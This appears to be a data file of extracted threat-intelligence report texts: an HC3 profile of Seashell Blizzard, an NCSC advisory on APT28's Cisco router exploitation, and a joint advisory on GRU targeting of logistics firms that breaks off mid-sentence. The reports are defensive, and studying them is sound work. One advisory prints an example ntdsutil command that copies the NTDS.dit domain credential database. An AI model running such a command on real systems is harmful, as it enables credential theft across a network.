Mechanism: Bypass User Account Control T1562.001 – Impair Defenses: Disable or Modify Tools T1218 – Signed Binary Proxy Execution T1070.004 – Indicator Removal on Host: File Deletion T1555.003 – Credentials from Web Browsers T1056.001 – Input Capture: Keylogging T1082 – System Information Discovery 22/27 T1021.001 – Remote Services: Remote Desktop Protocol (RDP) T1021.004 – Remote Services: SSH T1113 – Screen Capture T1005 – Data from Local System T1090.003 – Proxy: Multi-hop Proxy T1071.001 – Application Layer Protocol: Web Protocol T1105 – Ingress Tool Transfer T1041 – Exfiltration Over C2 Channel References [1] “Sandworm Team, ELECTRUM, Telebots, IRON VIKING, BlackEnergy (Group), Quedagh, Voodoo Bear, IRIDIUM, Seashell Blizzard, FROZENBARENTS, APT44, Group G0034 | MITRE ATT&CK®.” Accessed: Jan. 21, 2025. [Online]. Available: https://attack.mitre.org/groups/G0034/ [2] “2024-04-17-Mandiant-APT44-Unearthing-Sandworm.pdf.” Accessed: Jan. 21, 2025. [Online]. Available: https://nsarchive.gwu.edu/sites/default/files/documents/semon9- ryglx/2024-04-17-Mandiant-APT44-Unearthing-Sandworm.pdf [3] “Analyzing Dark Crystal RAT, a C# Backdoor,” Google Cloud Blog. Accessed: Jan. 21, 2025. [Online]. Available: https://cloud.google.com/blog/topics/threat- intelligence/analyzing-dark-crystal-rat-backdoor [4] “CERT-UA,” cert.gov.ua. Accessed: Jan. 21, 2025. [Online]. Available: https://cert.gov.ua/article/4279195 [5] O. Removska and R. Coalson, “Ukraine’s Trade Privileges On Line Over Intellectual-Piracy Concerns,” Radio Free Europe/Radio Liberty, 00:48:24Z. Accessed: Feb. 06, 2025. [Online]. Available: https://www.rferl.org/a/ukraine-sanctions-intellectual- property/24928537.html 23/27 [6] “VirusTotal - File - ed5735449a245355706fc58f4b744251f6e499833f02a972f9bd448c28467194.” Accessed: Jan. 21, 2025. [Online]. Available: https://www.virustotal.com/gui/file/ed5735449a245355706fc58f4b744251f6e499833f02a972f 9bd 448c28467194 [7] “KMSAuto++x64_v1.8.4 torrent.” Accessed: Jan. 21, 2025. [Online]. Available: https://btdig.com/172d3750e3617526563dd0b24c4ba88f907622b9 [8] Xelu86, “Key Management Services (KMS) client activation and product keys for Windows Server and Windows.” Accessed: Jan. 21, 2025. [Online]. Available: https://learn.microsoft.com/en-us/windows-server/get-started/kms-client-activation-keys [9] “Trojanized Windows 10 Operating System Installers Targeted Ukrainian Government | Mandiant,” Google Cloud Blog. Accessed: Jan. 19, 2025. [Online]. Available: https://cloud.google.com/blog/topics/threat-intelligence/trojanized-windows-installers- ukrainian-government [10] S. I. Gutierrez James Slaughter, and Fred, “Ukraine Targeted by Dark Crystal RAT (DCRat) | FortiGuard Labs,” Fortinet Blog. Accessed: Jan. 19, 2025. [Online]. Available: https://www.fortinet.com/blog/threat-research/ukraine-targeted-by-dark-crystal-rat [11] “VirusTotal - URL.” Accessed: Jan. 21, 2025. [Online]. Available: https://www.virustotal.com/gui/file/b9be4a6271c4660bb9a45985c85975330ab98454d0581de 979 738e3d3e71d03a/details [12] “VirusTotal - File - afc6131b17138a6132685617aa60293a40f2462dc3a810a4cf745977498e0255.” Accessed: Jan. 21, 2025. [Online]. Available: https://www.virustotal.com/gui/file/afc6131b17138a6132685617aa60293a40f2462dc3a810a4 cf74597 7498e0255/telemetry [13] “VirusTotal - File - a42de97a466868efbfc4aa1ef08bfdb3cc5916d1accd59cfffff1a896d569412.” Accessed: Jan. 21, 2025. [Online]. Available: https://www.virustotal.com/gui/file/a42de97a466868efbfc4aa1ef08bfdb3cc5916d1accd59cfffff 1a89 6d569412/details 24/27 [14] “VirusTotal - File - aadd85e88c0ebb0a3af63d241648c0670599c3365ff7e5620eb8d06902fdde83.” Accessed: Jan. 21, 2025. [Online]. Available: https://www.virustotal.com/gui/file/aadd85e88c0ebb0a3af63d241648c0670599c3365ff7e562 0eb 8d06902fdde83 [15] “VirusTotal - File - b545c5ee0498637737d4edff4b0cc672fe097a1ecfba1a08bb4d07e8affe79d3.” Accessed: Jan. 21, 2025. [Online]. Available: https://www.virustotal.com/gui/file/b545c5ee0498637737d4edff4b0cc672fe097a1ecfba1a08b b4d 07e8affe79d3/details [16] “1924a044-b30f-48a2-99c1-50edeac14da1_en.pdf.” Accessed: Feb. 07, 2025. [Online]. Available: https://enlargement.ec.europa.eu/document/download/1924a044-b30f- 48a2-99c1-50edeac14da1_en?filename=Ukraine%20Report%202024.pdf [17] “2018_BSA_GSS_Report_en.pdf.” Accessed: Feb. 07, 2025. [Online]. Available: https://gss.bsa.org/wp-content/uploads/2018/05/2018_BSA_GSS_Report_en.pdf [18] “CERT-UA,” cert.gov.ua. Accessed: Feb. 07, 2025. [Online]. Available: https://cert.gov.ua/article/4279195 [19] M. B. April 4 and 2023, “Pirated Software Compromised Ukrainian Utility Company.” Accessed: Feb. 07, 2025. [Online]. Available: https://www.bankinfosecurity.com/pirated- software-compromised-ukrainian-utility-company-a-21618 Talk to one of our experts Protect your organization with cutting-edge threat intelligence. Book your free demo today and explore how our products and services can help you meet your security needs. 25/27 Book a call 26/27 27/27"
G0034_sandworm,/Users/susan/Documents/PhD/HCI - Uncertainty/Project/TRACER/APT Reports/G0034_sandworm/seashell-blizzard-threat-actor-profile-tlpclear.pdf,e577aa8c0470,G0034,"HC3: Threat Actor Profile June 26, 2024 TLP:CLEAR Report: 202406261200 Seashell Blizzard Threat Actor Profile Executive Summary Seashell Blizzard is a cyber threat group believed to be associated with Russian intelligence agencies, particularly with Unit 74455, the Main Centre for Special Technologies within the Main Directorate of the General Staff of the Armed Forces of the Russian Federation. The group has been operating since at least 2009 and has been implicated in numerous high-profile cyberattacks targeting governments, critical infrastructure, and organizations across the globe. During the ongoing conflict in Ukraine, much of the group’s focus has been aimed toward disrupting Ukrainian operations and trying to obtain battlefield advantages; however, they have displayed a willingness and capability to shift this focus to benefit Russia’s broader national interests. Their tactics include sophisticated malware deployment, spear phishing campaigns, and exploitation of software vulnerabilities. Seashell Blizzard will continue to pose as a threat to cyber operations globally, and should be considered a significant threat to the Healthcare and Public Health (HPH) sector. Report Seashell Blizzard (also known as APT44 and Sandworm) is a sophisticated Russian state-sponsored actor who has been operational since at least 2009. The group has a broad range of capabilities and has previously garnered attention for deploying destructive malware. They have been regarded as Russia’s primary sabotage unit, but as the Russia-Ukraine conflict has progressed, a shift towards conducting espionage operations has been observed. This shift in operations is assessed to help provide advantages on the battlefield for the ongoing conflict. Seashell Blizzard has also been accredited with pursuing psychological operations by creating hacktivist personas on Telegram to claim or exaggerate the effectiveness of a campaign. According to Mandiant: “Google’s Threat Analysis Group assesses that APT44 has created and controlled a persona called ‘CyberArmyofRussia_Reborn,’ for example. In January, the group’s Telegram channel posted videos that took credit for the manipulation of human machine interfaces used in water utilities in the United States and Poland.” Tactics like this fall in line with the GRU’s Disruptive Playbook, which consists of five phases and is attributed to Seashell Blizzard activity: • Phase 1 - Living on the Edge: Gaining access through compromised edge infrastructure (and regaining access). • Phase 2 - Living Off the Land: Using tools to accomplish reconnaissance, lateral movement, and obtain information on the targeted network. • Phase 3 - Going for the GPO: Establishing enduring, elevated access to facilitate the deployment of wipers through a reliable script. • Phase 4 - Disrupt and Deny: Implementing wipers and innovative tools to suit a range of situations. • Phase 5 - Telegraphing “Success”: This involves announcing the success of an operation through Telegram, regardless of the outcome. U.S. Department of Health and Human Services Health Sector Cybersecurity Coordination Center (HC3) www.HHS.GOV/HC3 [TLP:CLEAR, ID#202406261200, Page 1 of 5] HC3: Threat Actor Profile June 26, 2024 TLP:CLEAR Report: 202406261200 P h a s e A s s e s s e d T e c h n ic a l B e n e f it s A s s e s s e d S t r a t e g ic B e n e f it s Livin g on th e Edge • Challen ging to defend and d ifficu lt to protect • Foothold fo r lateral m ovem ent • Scalable across different targets • M aintain access after disruption • G e neralize tactics for com m on enterprise techn olo gies • A void detection • Does not exposer sensitive tooling • Does not require resources to build custom too ls or utilities • G e neralize toolset fo r com m on enterprise operating system s Livin g o ff th e Land G o in g fo r th e G P O D isrup t an d D eny Te le g ra p h ""Su cce ss"" • • Privileged lateral m ovem en t and execution Can be used to im pair defenses. • • M axim izes disruptive effe cts across a dom ain Lim it sp illove r potential • Seam le ssly integrate ne w disruptive to o ls w hen required • Som etim es erases attacker presence • G enerate im m ediate disru ptive e ffe ct to key inform ation resources • C reate perceptions o f insecurity • Feigned extortion for additional psychological effect • G enerate seco nd -o rd er psychological effects. • Prim e the inform ation space • G enerate perception o f success • R einforce perception o f popular supp ort fo r w ar via ""hacktivist"" personas Figure 1: Google Playbook Phases Seashell Blizzard stands out as a persistent and operationally sophisticated adversary, adept at employing a range of initial access methods to infiltrate target networks. These methods span from conventional tactics, such as phishing and credential harvesting, to more targeted approaches, such as exploiting known vulnerabilities and compromising supply chains. Notably, the group favors initial access vectors that would grant broader entry to potential targets, which are later refined for specific exploitation. The group often exploits edge infrastructure, including routers and VPN appliances. Once inside a network perimeter, Seashell Blizzard engages in diverse activities, including furthering their reconnaissance efforts, data theft, downstream phishing, and deploying destructive malware such as wipers. In some cases, the group has also conducted software supply chain compromise for initial access. After initial access is obtained, the group is known for employing living off the land techniques to maintain persistence and exfiltrate data. Targeting Operations While much of Seashell Blizzard’s focus is believed to be centered on Ukraine, aligning with Russia's geopolitical objectives, the full reach of their operations extends globally, reflecting Russia’s broader national interests. Despite the ongoing conflict, the group maintains access and conducts espionage operations across various regions, including North America, Europe, the Middle East, Central Asia, and Latin America. Seashell Blizzard primarily targets government, defense, transportation, energy, media, and civil society organizations in Russia’s neighboring countries. Additional historical targeting has involved the electoral systems and institutions in Western countries, along with those from the North Atlantic Treaty Organization (NATO), with attempts to disrupt democratic U.S. Department of Health and Human Services Health Sector Cybersecurity Coordination Center (HC3) www.HHS.GOV/HC3 [TLP:CLEAR, ID#202406261200, Page 2 of 5] HC3: Threat Actor Profile June 26, 2024 TLP:CLEAR Report: 202406261200 processes and the deployment of malware. Seashell Blizzard has also targeted journalists, civil society organizations, and non-governmental bodies who are engaged in either research or investigations related to the Russian government. Notable Campaigns Seashell Blizzard has been attributed to several notable campaigns throughout the group’s existence: 1. BlackEnergy Attacks (2015): Seashell Blizzard gained international attention for its involvement in the BlackEnergy attacks targeting Ukraine's power grid, resulting in widespread outages. 2. NotPetya Ransomware (2017): Seashell Blizzard is widely believed to be behind the NotPetya ransomware attack, which caused billions of dollars in damages globally, particularly impacting Ukraine and organizations with Ukrainian connections. 3. Olympic Destroyer Malware (2018): Seashell Blizzard targeted the 2018 Winter Olympics in Pyeongchang, South Korea with the Olympic Destroyer malware, disrupting the event’s IT infrastructure. 4. Ukraine Electric Power Attack (2022): Seashell Blizzard utilized a combination of GOGETTER, Neo- REGEORG, CaddyWiper, and living off the land techniques to gain access to electric utilities in Ukraine, and sent unauthorized commands from their SCADA system. Tactics, Techniques, and Procedures (TTPs) The following is a list of known TTPs and software used by Seashell Blizzard. A more comprehensive list of tools and TTPS can be viewed on MITRE ATT&CK and in the technical annex accessible here. Initial Access External Remote Service: T1133 Phishing: Spearphishing Attachment: T1566.001 Phishing: Spearphishing Link: T1566.002 Supply Chain Compromise: Compromise Software Supply Chain: T1195.002 Trusted Relationship: T1199 Valid Accounts: Domain Accounts: T1078.002 Privilege Escalation Valid Accounts T1078 Account Manipulation T1098 Group Policy Modification: T1484.001 Persistence Account Manipulation: T1098 Create Account: Domain Account: T1136.002 Server Software Component: SQL Stored Procedures: T1505.001 Server Software Component: Web Shell: T1505.003 U.S. Department of Health and Human Services Health Sector Cybersecurity Coordination Center (HC3) www.HHS.GOV/HC3 [TLP:CLEAR, ID#202406261200, Page 3 of 5] HC3: Threat Actor Profile June 26, 2024 TLP:CLEAR Report: 202406261200 Lateral Movement Lateral Tool Transfer: T1570 Remote Services: SMB/Windows Admin Shares: T1021.002 Defense Evasion Deobfuscate/Decode Files or Information: T1140 Impair Defenses: Disable Windows Event Logging: T1562.002 Indicator Removal: File Deletion: T1070.004 Masquerading: Match Legitimate Name or Location: T1036.005 Obfuscated Files or Information: Software Packing: T1027.002 System Binary Proxy Execution: Rundll32: T1218.011 Execution Command and Scripting Interpreter: PowerShell: T1059.001 Command and Scripting Interpreter: Windows Command Shell: T1059.003 Command and Scripting Interpreter: Visual Basic: T1059.005 Exploitation for Client Execution: T1203 User Execution: Malicious Link: T1204.001 User Execution: Malicious File: T1204.002 Windows Management Instrumentation: T1047 Software Industroyer (Industroyer2) KillDisk BlackEnergy CaddyWiper NotPetya Olympic Destroyer Description Malware toolsets created to disrupt ICS/OT and components of SCADA power grids. Destructive malware with disk-wiping capabilities. Can create botnets to conduct DDoS attacks. Wipes all files under C:\Users along with available drives from D: to Z: by overwriting with a NULL value. Encrypting malware that targets Windows-based systems. Destructive malware with worm-like features that renders computer systems inoperable. Indicators of Compromise The following resources contain Indicators of Compromise for Seashell Blizzard: VirusTotal:https://www.virustotal.com/gui/collection/0bd93a520cae1fd917441e6e54ff263c88069ac5a 7f8b9e55ef99cd961b6a1c7/iocs Conclusion Seashell Blizzard will continue to be a prominent threat to cyber operations globally. As the Russia-Ukraine conflict continues, Seashell Blizzard’s operations will likely primarily focus on Ukraine. However, as previously observed, the group will stay ready to and capable of shifting focus and targeting neighboring and western countries as it benefits Russia’s broader national interests. U.S. Department of Health and Human Services Health Sector Cybersecurity Coordination Center (HC3) www.HHS.GOV/HC3 [TLP:CLEAR, ID#202406261200, Page 4 of 5] HC3: Threat Actor Profile June 26, 2024 TLP:CLEAR Report: 202406261200 References Quorum Cyber. Seashell Blizzard Threat Actor Profile. https://www.quorumcyber.com/threat- actors/seashell-blizzard-threat-actor-profile/ Mandiant. April 17, 2024. Unearthing APT44: Russia’s Notorious Cyber Sabotage Unit Sandworm. https://cloud.google.com/blog/topics/threat-intelligence/apt44-unearthing-sandworm Mandiant. July 12, 2023. The GRU’s Disruptive Playbook. https://cloud.google.com/blog/topics/threat- intelligence/gru-disruptive-playbook MITRE ATT&CK. Sandworm Team. https://attack.mitre.org/groups/G0034/ Barnett, Patrick. May 31, 2024. Understanding Sandworm, a State-Sponsored Threat Group. ISACA. https://www.isaca.org/resources/news-and-trends/industry-news/2024/understanding-sandworm-a- state-sponsored-threat-group O’Donnell-Welch, Lindsey. April 19, 2024. A Decade of Sandworm: Digging into APT44’s Past and Future. Decipher. https://duo.com/decipher/a-decade-of-sandworm-digging-into-apt44-s-past-and-future O’Donnell-Welch, Lindsey. April 17, 2024. Sandworm Group Shifts to Espionage Attacks, Hacktivist Personas, Decipher. https://duo.com/decipher/sandworm-group-shifts-to-espionage-attacks-hacktivist- personas Contact Information If you have any additional questions, we encourage you to contact us at HC3@hhs.gov. We want to know how satisfied you are with the resources HC3 provides. Your answers will be anonymous, and we will use the responses to improve all future updates, features, and distributions. Share Your Feedback U.S. Department of Health and Human Services Health Sector Cybersecurity Coordination Center (HC3) www.HHS.GOV/HC3 [TLP:CLEAR, ID#202406261200, Page 5 of 5]"
G0007_APT28,/Users/susan/Documents/PhD/HCI - Uncertainty/Project/TRACER/APT Reports/G0007_APT28/apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers-uk.pdf,1b5188234b33,G0007,"Advisory. APT28 exploits known vulnerability to carry out reconnaissance and deploy malware on Cisco routers Version 1 18 April 2023  Crown Copyright 2023 APT28 exploits known vulnerability to carry out reconnaissance of routers and deploy malware APT28 accesses poorly maintained Cisco routers and deploys malware on unpatched devices using CVE-2017-6742. Overview and context The UK National Cyber Security Centre (NCSC), the US National Security Agency (NSA), US Cybersecurity and Infrastructure Security Agency (CISA) and US Federal Bureau of Investigation (FBI) are releasing this joint advisory to provide details of tactics, techniques and procedures (TTPs) associated with APT28’s exploitation of Cisco routers in 2021. We assess that APT28 is almost certainly the Russian General Staff Main Intelligence Directorate (GRU) 85th special Service Centre (GTsSS) Military Intelligence Unit 26165. APT28 (also known as Fancy Bear, STRONTIUM, Pawn Storm, the Sednit Gang and Sofacy) is a highly skilled threat actor. Previous activity The NCSC has previously attributed the following activity to APT28: • cyber attacks against the German parliament in 2015, including data theft and disrupting email accounts of German Members of Parliament (MPs) and the Vice Chancellor • attempted attack against the Organisation for the Prohibition of Chemical Weapons (OPCW) in April 2018, to disrupt independent analysis of chemicals weaponised by the GRU in the UK For more information on APT28 activity, see the advisory ‘Russian State-Sponsored and Criminal Cyber Threats to Critical Infrastructure’ and ‘Russian GRU Conducting Global Brute Force Campaign to Compromise Enterprise and Cloud Environments’ As of 2021, APT28 has been observed using commercially available code repositories, and post-exploit frameworks such as Empire. This included the use of Powershell Empire, in addition to Python versions of Empire. Reconnaissance Use of SNMP protocol to access routers In 2021, APT28 used infrastructure to masquerade Simple Network Management protocol (SNMP) access into Cisco routers worldwide. This included a small number based in Europe, US government institutions and approximately 250 Ukrainian victims. SNMP is designed to allow network administrators to monitor and configure network devices remotely, but it can also be misused to obtain sensitive network information and, if vulnerable, exploit devices to penetrate a network. A number of software tools can scan the entire network using SNMP, meaning that poor configuration such as using default or easy-to-guess community strings, can make a network susceptible to attacks. Weak SNMP community strings, including the default ‘public’, allowed APT28 to gain access to router information. APT28 sent additional SNMP commands to enumerate router interfaces. [T1078.001] The compromised routers were configured to accept SNMP v2 requests. SNMP v2 doesn’t support encryption and so all data, including community strings, is sent unencrypted. Exploitation of CVE-2017-6742 APT28 exploited the vulnerability CVE-2017-6742 (Cisco Bug ID: CSCve54313) [T1190]. This vulnerability was first announced by Cisco on 29 June 2017, and patched software was made available. Cisco's published advisory provided workarounds, such as limiting access to SNMP from trusted hosts only, or by disabling a number of SNMP Management Information bases (MIBs). Malware deployment For some of the targeted devices, APT28 actors used an SNMP exploit to deploy malware, as detailed in the NCSC’s Jaguar Tooth malware analysis report. This malware obtained further device information, which is exfiltrated over trivial file transfer protocol (TFTP), and enabled unauthenticated access via a backdoor. The actor obtained this device information by executing a number of Command Line Interface (CLI) commands via the malware. It includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses [T1590] Indicators of compromise (IoCs) Please refer to the accompanying malware analysis report for indicators of compromise which may help to detect this activity. MITRE ATT&CK® This advisory has been compiled with respect to the MITRE ATT&CK® framework, a globally accessible knowledge base of adversary tactics and techniques based on real-world observations. For detailed TTPs, see the malware analysis report. Tactic ID Technique Procedure Initial Access T1190 Exploit Public- facing Application. Initial Access T1078.001 Valid Accounts. Default Accounts. Reconnais sance T1590 Gather victim network information APT28 exploited default/well-known community strings in SNMP as outlined in CVE-2017-6742 (Cisco Bug ID: CSCve54313) Actors accessed victim routers by using default community strings such as ‘public’ Access was gained to perform reconnaissance on victim devices. Further detail of how this was achieved in available in the MITRE ATT&CK section Conclusion of the Jaguar Tooth MAR APT28 has been known to access vulnerable routers by using default and weak SNMP community strings, and by exploiting CVE-2017-6742 (Cisco Bug ID: CSCve54313) as published by Cisco. TTPs in this advisory may still be used against vulnerable Cisco devices. Organisations are advised to follow the mitigation advice in this advisory to defend against this activity. Reporting UK organisations should report any suspected compromises to the NCSC. US organisations should contact CISA’s 24/7 Operations Centre at Report@cisa.gov or (888) 282-0870 Mitigation o Patch devices as advised by Cisco. The NCSC also has general guidance on managing updates and keeping software up to date. o Do not use SNMP if you are not required to configure or manage devices remotely to prevent unauthorised users from accessing your router. • If you are required to manage routers remotely, establish allow and deny lists for SNMP messages to prevent unauthorised users from accessing your router. o Do not allow unencrypted (ie, plaintext) management protocols, such as SNMP v2 and Telnet. Where encrypted protocols aren’t possible, you should carry out any management activities from outside the organisation through an encrypted virtual private network (VPN), where both ends are mutually authenticated. o Enforce a strong password policy. Don’t reuse the same password for multiple devices. Each device should have a unique password. Where possible, avoid legacy password-based authentication and implement two- factor authentication based on public-private key. o Disable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c. Where possible, use modern encrypted protocols such as SSH and SNMP v3. Harden the encryption protocols based on current best security practice. The NCSC strongly advises owners and operators to retire and replace legacy devices that can’t be configured to use SNMP v3. o Use logging tools to record commands executed on your network devices, such as TACACS+ and Syslog. Use these logs to immediately highlight suspicious events and keep a record of events to support an investigation if the device’s integrity is ever in question. See NCSC guidance on monitoring and logging. o If you suspect your router has been compromised: • Follow Cisco’s advice for verifying the Cisco IOS image. • Revoke all keys associated with that router. When replacing the router configuration be sure to create new keys rather than pasting from the old configuration. • • Replace both the ROMMON and Cisco IOS image with an image that has been sourced directly from the Cisco website, in case third party and internal repositories have been compromised. o NSA’s Network Infrastructure guide provides some best practices for SNMP. o See also the Cisco IOS hardening guide and Cisco’s Jaguar Tooth blog."
G0007_APT28,/Users/susan/Documents/PhD/HCI - Uncertainty/Project/TRACER/APT Reports/G0007_APT28/CSA_RUSSIAN_GRU_TARGET_LOGISTICS.pdf,dcf0111d6724,G0007,"Joint Cybersecurity Advisory TLP:CLEAR Russian GRU Targeting Western Logistics Entities and Technology Companies Executive Summary This joint cybersecurity advisory (CSA) highlights a Russian state-sponsored cyber campaign targeting Western logistics entities and technology companies. This includes those involved in the coordination, transport, and delivery of foreign assistance to Ukraine. Since 2022, Western logistics entities and IT companies have faced an elevated risk of targeting by the Russian General Staff Main Intelligence Directorate (GRU) 85th Main Special Service Center (85th GTsSS), military unit 26165—tracked in the cybersecurity community under several names (see “Cybersecurity Industry Tracking”). The actors’ cyber espionage-oriented campaign, targeting technology companies and logistics entities, uses a mix of previously disclosed tactics, techniques, and procedures (TTPs). The authoring agencies expect similar targeting and TTP use to continue. Executives and network defenders at logistics entities and technology companies should recognize the elevated threat of unit 26165 targeting, increase monitoring and threat hunting for known TTPs and indicators of compromise (IOCs), and posture network defenses with a presumption of targeting. This report is marked TLP:CLEAR. Recipients may share this information without restriction. Information is subject to standard copyright rules. U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR This cyber espionage-oriented campaign targeting logistics entities and technology companies uses a mix of previously disclosed TTPs and is likely connected to these actors’ wide scale targeting of IP cameras in Ukraine and bordering NATO nations. The following authors and co-sealers are releasing this CSA:  United States National Security Agency  United States Cybersecurity and (NSA)  United States Federal Bureau of Infrastructure Security Agency (CISA)  United States Department of Defense Investigation (FBI) Cyber Crime Center (DC3)  United Kingdom National Cyber Security  United States Cyber Command Centre (NCSC-UK) (USCYBERCOM)  Germany Federal Intelligence Service  Australian Signals Directorate’s (BND)1  Germany Federal Office for Information Security (BSI)2  Germany Federal Office for the Protection of the Constitution (BfV)3  Czech Republic Military Intelligence Australian Cyber Security Centre (ASD’s ACSC)  Canadian Centre for Cyber Security (CCCS)  Danish Defence Intelligence Service (DDIS)9 (VZ)4  Estonian Foreign Intelligence Service  Czech Republic National Cyber and (EFIS)10 Information Security Agency (NÚKIB)5  Estonian National Cyber Security  Czech Republic Security Information Centre (NCSC-EE)11 Service (BIS)6  Poland Internal Security Agency (ABW)7  Poland Military Counterintelligence Service (SKW)8  French Cybersecurity Agency (ANSSI)12  Netherlands Defence Intelligence and Security Service (MIVD)13 1 Bundesnachrichtendienst 2 Bundesamt für Sicherheit in der Informationstechnik 3 Bundesamt für Verfassungsschutz 4 Vojenské zpravodajství 5 Národní úřad pro kybernetickou a informační bezpečnost 6 Bezpečnostní informační služba 7 Agencja Bezpieczeństwa Wewnętrznego 8 Służba Kontrwywiadu Wojskowego 9 Forsvarets Efterretningstjeneste 10 Välisluureamet 11 Küberturvalisuse keskus 12 Agence nationale de la sécurité des systèmes d'information 13 Militaire Inlichtingen- en Veiligheidsdienst U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 2 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR Introduction For over two years, the Russian GRU 85th GTsSS, military unit 26165—commonly known in the cybersecurity community as APT28, Fancy Bear, Forest Blizzard, BlueDelta, and a variety of other identifiers—has conducted this campaign using a mix of known tactics, techniques, and procedures (TTPs), including reconstituted password spraying capabilities, spearphishing, and modification of Microsoft Exchange mailbox permissions. In late February 2022, multiple Russian state-sponsored cyber actors increased the variety of cyber operations for purposes of espionage, destruction, and influence—with unit 26165 predominately involved in espionage. [1] As Russian military forces failed to meet their military objectives and Western countries provided aid to support Ukraine’s territorial defense, unit 26165 expanded its targeting of logistics entities and technology companies involved in the delivery of aid. These actors have also targeted Internet- connected cameras at Ukrainian border crossings to monitor and track aid shipments. Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 17. See Appendix A: MITRE ATT&CK tactics and techniques for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques. This advisory uses the MITRE D3FEND® framework, version 1.0. Description of Targets The GRU unit 26165 cyber campaign against Western logistics providers and technology companies has targeted dozens of entities, including government organizations and private/commercial entities across virtually all transportation modes: air, sea, and rail. These actors have targeted entities associated with the following verticals within NATO member states, Ukraine, and at international organizations:  Defense Industry  Transportation and Transportation Hubs (ports, airports, etc.)  Maritime  Air Traffic Management  IT Services In the course of the targeting lifecycle, unit 26165 actors identified and conducted follow-on targeting of additional entities in the transportation sector that had business U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 3 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR ties to the primary target, exploiting trust relationships to attempt to gain additional access [T1199]. The actors also conducted reconnaissance on at least one entity involved in the production of industrial control system (ICS) components for railway management, though a successful compromise was not confirmed [TA0043]. The countries with targeted entities include the following, as illustrated in Figure 1:  Bulgaria  Czech Republic  France  Germany  Greece Italy   Moldova  Netherlands  Poland  Romania  Slovakia  Ukraine  United States Figure 1: Countries with Targeted Entities Initial Access TTPs To gain initial access to targeted entities, unit 26165 actors used several techniques to gain initial access to targeted entities, including (but not limited to):  Credential guessing [T1110.001] / brute force [T1110.003]  Spearphishing for credentials [T1566]  Spearphishing delivering malware [T1566]  Outlook NTLM vulnerability (CVE-2023-23397)  Roundcube vulnerabilities (CVE-2020-12641, CVE-2020-35730, CVE-2021-44026)  Exploitation of Internet-facing infrastructure, including corporate VPNs [T1133], via public vulnerabilities and SQL injection [T1190]  Exploitation of WinRAR vulnerability (CVE-2023-38831) U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 4 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR The actors abused vulnerabilities associated with a range of brands and models of small office/home office (SOHO) devices to facilitate covert cyber operations, as well as proxy malicious activity via devices with geolocation in proximity to the target [T1665]. [2] Credential Guessing/Brute Force Unit 26165 actors’ credential guessing [T1110.001] operations in this campaign exhibit some similar characteristics to those disclosed in the previous CSA “Russian GRU Conducting Global Brute Force Campaign to Compromise Enterprise and Cloud Environments.” [3] Based on victim network investigations, the current iteration of this TTP employs a similar blend of anonymization infrastructure, including the use of Tor and commercial VPNs [T1090.003]. The actors frequently rotated the IP addresses used to further hamper detection. All observed connections were made via encrypted TLS [T1573]. Spearphishing GRU unit 26165 actors’ spearphishing emails included links [T1566.002] leading to fake login pages impersonating a variety of government entities and Western cloud email providers’ webpages. These webpages were typically hosted on free third-party services or compromised SOHO devices and often used legitimate documents associated with thematically similar entities as lures. The subjects of spearphishing emails were diverse and ranged from professional topics to adult themes. Phishing emails were frequently sent via compromised accounts or free webmail accounts [T1586.002, T1586.003]. The emails were typically written in the target’s native language and sent to a single targeted recipient. Some campaigns employed multi-stage redirectors [T1104] verifying IP-geolocation [T1627.001] and browser fingerprints [T1627] to protect credential harvesting infrastructure or provide multifactor authentication (MFA) [T1111] and CAPTCHA relaying capabilities [T1056]. Connecting endpoints failing the location checks were redirected to a benign URL [T1627], such as msn.com. Redirector services used include:  Webhook[.]site  FrgeIO  InfinityFree U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 5 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR  Dynu  Mocky  Pipedream  Mockbin[.]org The actors also used spearphishing to deliver malware (including HEADLACE and MASEPIE) executables [T1204.002] delivered via third-party services and redirectors [T1566.002], scripts in a mix of languages [T1059] (including BAT [T1059.003] and VBScript [T1059.005]) and links to hosted shortcuts [T1204.001]. CVE Usage Throughout this campaign, GRU unit 26165 weaponized an Outlook NTLM vulnerability (CVE-2023-23397) to collect NTLM hashes and credentials via specially crafted Outlook calendar appointment invitations [T1187]. [4], [5] These actors also used a series of Roundcube CVEs (CVE-2020-12641, CVE-2020-35730, and CVE-2021-44026) to execute arbitrary shell commands [T1059], gain access to victim email accounts, and retrieve sensitive data from email servers [T1114]. Since at least fall 2023, the actors leveraged a WinRAR vulnerability (CVE-2023-38831) allowing for the execution of arbitrary code embedded in an archive as a means of initial access [T1659]. The actors sent emails with malicious attachments [T1566.001] or embedded hyperlinks [T1566.002] that downloaded a malicious archive prepared using this CVE. Post-Compromise TTPs After an initial compromise using one of the above techniques, unit 26165 actors conducted contact information reconnaissance to identify additional targets in key positions [T1589.002]. The actors also conducted reconnaissance of the cybersecurity department [T1591], individuals responsible for coordinating transport [T1591.004], and other companies cooperating with the victim entity [T1591.002]. The actors used native commands and open source tools, such as Impacket and PsExec, to move laterally within the environment [TA0008]. Multiple Impacket scripts were used as .exe files, in addition to the python versions, depending on the victim environment. The actors also moved laterally within the network using Remote Desktop Protocol (RDP) [T1021.001] to access additional hosts and attempt to dump Active U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 6 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR Directory NTDS.dit domain databases [T1003.003] using native Active Directory Domain Services commands, such as in Figure 2: Example Active Directory Domain Services command: C:\Windows\system32\ntdsutil.exe ""activate instance ntds"" ifm ""create full C:\temp\[a-z]{3}"" quit quit Figure 2: Example Active Directory Domain Services command Additionally, GRU unit 26165 actors used the tools Certipy and ADExplorer.exe to exfiltrate 